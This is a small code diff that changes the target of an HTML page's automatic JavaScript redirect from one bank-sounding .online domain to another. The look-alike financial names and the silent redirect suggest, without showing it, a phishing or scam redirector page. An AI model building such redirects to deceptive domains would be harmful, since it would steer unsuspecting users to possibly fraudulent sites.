@@ -9,7 +9,7 @@
 </head>
 <body>
 	<script>
-		window.location.replace('https://trustwaveunion.online/');
+		window.location.replace('https://uniontrustalliance.online/');
 	</script>
 </body>
 </html>
